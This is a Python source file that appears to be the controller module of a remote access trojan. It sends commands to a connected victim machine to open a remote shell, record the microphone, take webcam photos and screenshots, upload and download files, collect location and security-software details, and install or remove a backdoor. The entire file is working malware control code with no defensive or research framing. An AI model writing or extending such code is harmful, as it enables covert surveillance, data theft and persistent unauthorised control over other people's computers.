from .encrypter import *
from .system import system
from .options import *
from .comm import send_data, recv_data
from colorama import Fore, init, Style
from threading import *
import random, os, struct, simplejson

def send_notification(conn, address):
    title = "Title"
    message = "Message"
    app = "App"
    while True:
        system.clear_screen()
        system.printheader()
        print(Fore.LIGHTCYAN_EX + options.notification_options)
        command = system.input(10)
        if command == "1":
            title = system.input(7)
        elif command == "2":
            message = system.input(8)
        elif command == "3":
            app = system.input(9)
        elif command == "4":
            try:
                send_data(conn, b"MODE_NOTIFICATION")
                json_send(conn, {"title":title, "message":message, "app":app})
            except Exception as e:
                print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
                input("OK")
            
            break
        elif command == "9": break
    
    input("OK")

def json_receive(conn):
    try:
        raw_data = recv_data(conn)
        if not raw_data:
            return {}
        return simplejson.loads(raw_data)
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] JSON Receive Error: {e}")
        return {}

def json_send(conn, data):
    try:
        json_data = simplejson.dumps(data)
        send_data(conn, json_data.encode("utf-8"))
    except Exception as e: 
        input("OK")
        print(Fore.LIGHTRED_EX + f'[!] Error: {e}')

def geo(conn, address):
    send_data(conn, b"MODE_GEO")
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data)
    input("OK")

def secinfo(conn, address):
    send_data(conn, b"MODE_SECINFO")
    data = json_receive(conn)
    options.printSecurityInfoText(data)
    input("OK")

def sysinfo(conn, address):
    send_data(conn, b"MODE_SYSINFO")
    data = json_receive(conn)
    print(options.getSystemInfoText(data))
    input("OK")

def mic(conn, address):
    if not os.path.exists("records"): os.makedirs("records")
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    send_data(conn, b"MODE_MIC")
    data = recv_data(conn, decode=False)
    with open(f"records/record{number}.wav", "wb") as f:
        f.write(data)
        f.close()
    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
    input("OK")
def getInput(conn):
    send_data(conn, b"SHELLINFO")
    return recv_data(conn)
def shell(conn, address):
    send_data(conn, b"MODE_SHELL")
    try:
        while True:
            send_data(conn, b"SHELLINFO")
            prompt_text = recv_data(conn)
            cmd = input(prompt_text)
            if not cmd.strip():
                continue
            if cmd == 'exit':
                system.clear_screen()
                send_data(conn, b"exit")
                break
            send_data(conn, cmd.encode())
            if cmd == 'clear':
                system.clear_screen()
            try:
                output = recv_data(conn)
                print(Fore.LIGHTGREEN_EX + output)
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
                input("OK")
                break
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
        input("OK")

def upload(conn, address, path=None, name=None):
    path = path or input("File Path: ")
    name= name or input("Destination File Name: ")
        
    try:
        with open(path, 'rb') as f:
            data = f.read()
        send_data(conn, b"MODE_UPLOAD")
        send_data(conn, name.encode())

        control = recv_data(conn)
        send_data(conn, data)
        print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
    except Exception as error:
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
        input("OK")
    input("OK")
    
def download(conn, address):
    send_data(conn, b"MODE_DOWNLOAD")
    path = input("File Path: ")
    name = input("Destination File Name: ")
    send_data(conn, path.encode())
    try:
        send_data(conn, b'control')

        data = recv_data(conn, decode=False)
        with open(name, 'wb') as f:
            f.write(data)
    except Exception as error: 
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
        input("OK")
    input("OK")

def cam(conn, address):
    if not os.path.exists("photos"): os.makedirs("photos")
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    send_data(conn, b"MODE_CAM")
    data = recv_data(conn, decode=False)
    with open(f"photos/photo{number}.jpg", "wb") as f:
        f.write(data)
    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: photos/photo{number}.jpg")
    input("OK")

def screenshot(conn, address):
    if not os.path.exists("photos"): os.makedirs("photos")
    try:
        number = random.randint(0, 9999999)
        print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
        send_data(conn, b"MODE_SCREENSHOT")
        data = recv_data(conn, decode=False)
        with open(f"photos/screenshot{number}.jpg", "wb") as f:
            f.write(data)
        print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: photos/screenshot{number}.jpg")
    except Exception as e: 
        print(e)
        input("OK")
    input("OK")

def backdoor(conn, address):
    send_data(conn, b"MODE_BACKDOOR")
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + f"[+] Created Backdoor")
    input("OK")

def delete(conn, address):
    send_data(conn, b"MODE_DEL")
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Destroyed Backdoor")
    input("OK")

def agentinfo(conn, address):
    print(Fore.LIGHTGREEN_EX + f"IP : {address[0]} PORT : {str(address[1])}")
    input("OK")